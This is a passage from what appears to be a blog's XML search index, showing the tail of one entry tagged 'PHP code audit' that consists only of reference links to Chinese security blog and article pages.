href="https://www.cnblogs.com/zpchcbd/p/12552185.html">https://www.cnblogs.com/zpchcbd/p/12552185.html</a></p><p>@<a href="https://paper.seebug.org/573/">https://paper.seebug.org/573/</a></p><p>@<a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a></p><p>@<a href="https://blog.csdn.net/Mruos/article/details/109802121">https://blog.csdn.net/Mruos/article/details/109802121</a></p><p>@<a href="https://blog.csdn.net/qq_33382313/article/details/51702787">https://blog.csdn.net/qq_33382313/article/details/51702787</a></p><p>@<a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
